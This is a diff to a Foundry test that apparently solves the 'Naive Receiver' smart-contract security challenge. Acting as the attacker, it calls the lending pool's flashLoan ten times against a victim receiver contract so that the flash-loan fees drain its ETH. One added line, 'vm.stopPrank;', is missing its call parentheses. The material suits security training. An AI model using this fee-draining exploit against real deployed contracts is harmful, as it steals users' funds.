@@ -47,9 +47,15 @@ contract NaiveReceiver is Test {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
+    // forge test --match-contract NaiveReceiver
     function testExploit() public {
         /** EXPLOIT START **/
-
+        vm.startPrank(attacker);
+        // calls flashloan 10 times since victim has 10eth and fee is 1eth. each iteration the victim's balance drains by 1 eth.
+        for(uint i; i<10; ++i) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        }
+        vm.stopPrank;
         /** EXPLOIT END **/
         validation();
     }
